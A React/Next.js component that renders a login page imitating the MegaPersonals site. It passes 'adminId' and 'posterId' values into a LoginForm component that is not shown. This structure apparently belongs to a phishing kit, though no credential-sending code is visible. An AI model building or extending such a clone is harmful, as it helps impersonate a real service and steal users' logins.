"use client";

import LoginForm from "@/app/components/LoginForm";

export default function Home({ adminId, posterId }) {
  return (
    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
      <div className="w-[65%] lg:w-full">
        <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
      </div>

      <LoginForm adminId={adminId} posterId={posterId} />

      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
        <p className=" cursor-pointer">Home</p>
        {" | "}
        <p className=" cursor-pointer">Manage Posts</p>
        {" | "}
        <p className=" cursor-pointer">Contact Us</p>
        {" | "}
        <p className=" cursor-pointer">Policies & Terms</p>
      </div>

      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
        Copyright ©2024 MegaPersonals.eu
      </p>
    </div>
  );
}
